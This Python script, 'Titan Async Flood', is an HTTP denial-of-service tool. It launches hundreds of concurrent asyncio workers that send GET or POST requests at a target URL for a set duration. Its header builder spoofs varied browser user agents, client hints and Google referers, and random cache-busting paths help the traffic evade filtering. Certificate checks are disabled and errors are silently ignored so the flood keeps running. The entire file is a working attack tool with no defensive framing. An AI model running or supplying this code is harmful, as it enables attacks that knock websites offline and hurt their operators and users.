#!/usr/bin/env python3
# ============================================================
# Titan Async Flood v2.0 - HTTP/1.1 Async Flood
# Author: github.com/thesystemowner
# Technique: asyncio + aiohttp, 600+ req/s per core
# ============================================================

import asyncio
import aiohttp
import random
import sys
import time
import signal
from urllib.parse import urlparse

ua_pool = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
]

accepts = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
]

langs = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8,en-US;q=0.5",
    "es-ES,es;q=0.9,en;q=0.5",
    "pt-BR,pt;q=0.9,en;q=0.5",
    "fr-FR,fr;q=0.9,en;q=0.5",
]

sec_ch_ua = [
    '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    '"Google Chrome";v="130", "Chromium";v="130", "Not_A Brand";v="24"',
]

proxies = []
running = True
sent = 0


def build_headers(target_url):
    parsed = urlparse(target_url)
    ua = random.choice(ua_pool)
    h = {
        "User-Agent": ua,
        "Accept": random.choice(accepts),
        "Accept-Language": random.choice(langs),
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Referer": f"https://www.google.com/search?q={random.randint(0, 999999)}",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "DNT": "1",
        "Connection": "keep-alive",
    }
    if "Chrome" in ua:
        h["Sec-CH-UA"] = random.choice(sec_ch_ua)
        h["Sec-CH-UA-Mobile"] = "?0"
        h["Sec-CH-UA-Platform"] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
    return h


def random_path(base_path):
    if "%RAND%" in base_path:
        return base_path.replace(
            "%RAND%",
            "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(6, 16))),
        )
    return base_path


async def attack_worker(
    session: aiohttp.ClientSession, target_url: str, method: str, duration: int
):
    global sent
    base_path = urlparse(target_url).path or "/"
    if not base_path.startswith("/"):
        base_path = "/" + base_path

    end = time.time() + duration
    while running and time.time() < end:
        try:
            path = random_path(base_path)

            full_url = f"{target_url.rstrip('/')}{path}"

            hdrs = build_headers(target_url)
            if method.upper() == "POST":
                hdrs["Content-Type"] = "application/x-www-form-urlencoded"
                data = f"key={'a' * random.randint(10, 100)}"
                async with session.post(
                    full_url, headers=hdrs, data=data, ssl=False, timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    await resp.read()
            else:
                async with session.get(
                    full_url, headers=hdrs, ssl=False, timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    await resp.read()
            sent += 1
        except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
            pass
        except Exception:
            pass


async def load_proxies(path: str):
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and ":" in line:
                    proxies.append(line)
        print(f"[+] Loaded {len(proxies)} proxies")
    except FileNotFoundError:
        print("[-] No proxy file found, running without proxies")


async def main():
    global running
    if len(sys.argv) < 4:
        print("Usage: python titan-async.py <url> <method(GET|POST)> <duration> [threads] [proxyfile]")
        print("  threads  = concurrent connections (default 500)")
        print("  proxyfile = proxy list file (optional)")
        sys.exit(1)

    target = sys.argv[1]
    method = sys.argv[2].upper()
    duration = int(sys.argv[3])
    num_workers = int(sys.argv[4]) if len(sys.argv) > 4 else 500

    if len(sys.argv) > 5:
        await load_proxies(sys.argv[5])

    def shutdown():
        global running
        running = False
        print(f"\n[!] Shutting down. Total requests sent: {sent}")

    signal.signal(signal.SIGINT, lambda s, f: shutdown())

    print(f"[+] Titan Async Flood")
    print(f"[+] Author: github.com/thesystemowner")
    print(f"[+] Target: {target}")
    print(f"[+] Method: {method}")
    print(f"[+] Duration: {duration}s")
    print(f"[+] Workers: {num_workers}")
    print(f"[+] Proxies: {'Yes (' + str(len(proxies)) + ')' if proxies else 'No (direct)'}")

    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        ttl_dns_cache=300,
        force_close=False,
        enable_cleanup_closed=True,
    )

    async with aiohttp.ClientSession(
        connector=connector,
        cookie_jar=aiohttp.DummyCookieJar(),
        connector_owner=False,
    ) as session:
        tasks = []
        for _ in range(num_workers):
            t = asyncio.create_task(attack_worker(session, target, method, duration))
            tasks.append(t)

        await asyncio.sleep(duration)
        running = False
        await asyncio.gather(*tasks, return_exceptions=True)

    print(f"[+] Attack finished. Total requests sent: {sent}")
    print(f"[+] Avg rate: {sent // duration} req/s")


if __name__ == "__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass